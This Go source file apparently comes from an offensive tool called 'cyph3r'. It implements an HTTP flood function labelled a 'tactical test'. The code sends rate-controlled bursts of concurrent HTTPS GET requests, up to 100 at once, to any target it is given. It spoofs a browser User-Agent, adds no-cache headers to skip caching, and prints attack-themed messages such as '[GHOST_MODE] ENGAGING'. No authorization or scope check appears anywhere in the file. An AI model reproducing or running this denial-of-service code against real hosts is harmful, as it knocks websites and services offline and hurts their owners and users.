package intel

import (
	"context"
	"fmt"
	"net/http"
	"sync"
	"time"
	"github.com/AnonPhoenix420/cyph3r/internal/output"
)

const MaxBurst = 100

type TacticalConfig struct {
	Target string
	Vector string
	PPS    int
}

func RunTacticalTest(cfg TacticalConfig, ctx context.Context) {
	var wg sync.WaitGroup
	sem := make(chan struct{}, MaxBurst)

	fmt.Printf("\n%s[GHOST_MODE] ENGAGING %s VECTOR -> %s%s\n", output.NeonPink, cfg.Vector, cfg.Target, output.Reset)

	ticker := time.NewTicker(time.Second / time.Duration(cfg.PPS))
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			fmt.Printf("\n%s[+] Session Terminated Cleanly.%s\n", output.NeonGreen, output.Reset)
			return
		case <-ticker.C:
			sem <- struct{}{}
			wg.Add(1)
			go func() {
				defer wg.Done()
				defer func() { <-sem }()
				
				client := &http.Client{Timeout: 2 * time.Second}
				req, _ := http.NewRequest("GET", "https://"+cfg.Target, nil)
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0")
				req.Header.Set("Cache-Control", "no-cache")
				
				resp, err := client.Do(req)
				if err == nil {
					resp.Body.Close()
				}
			}()
		}
	}
}
